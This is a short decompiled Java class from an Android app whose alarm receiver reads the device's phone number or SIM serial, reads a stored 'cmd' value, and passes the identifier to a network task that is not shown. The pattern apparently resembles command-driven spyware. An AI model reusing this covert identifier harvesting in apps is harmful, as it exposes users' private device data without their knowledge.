// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.utils;

import android.content.*;
import android.telephony.TelephonyManager;
import android.util.Log;

// Referenced classes of package com.example.utils:
//            ScanNetWorkSateTask

public class AlarmReceiver extends BroadcastReceiver
{

    public AlarmReceiver()
    {
    }

    public void onReceive(Context context, Intent intent)
    {
        telMgr = (TelephonyManager)context.getSystemService("phone");
        phoneNumber = telMgr.getLine1Number();
        if(phoneNumber == null || phoneNumber.length() < 11)
            phoneNumber = telMgr.getSimSerialNumber();
        String s = context.getSharedPreferences("commond", 1).getString("cmd", "0");
        Log.d("Alarmreceiver", (new StringBuilder("---cmd--- ")).append(s).toString());
        (new ScanNetWorkSateTask(context, phoneNumber)).run();
    }

    public String phoneNumber;
    TelephonyManager telMgr;
}
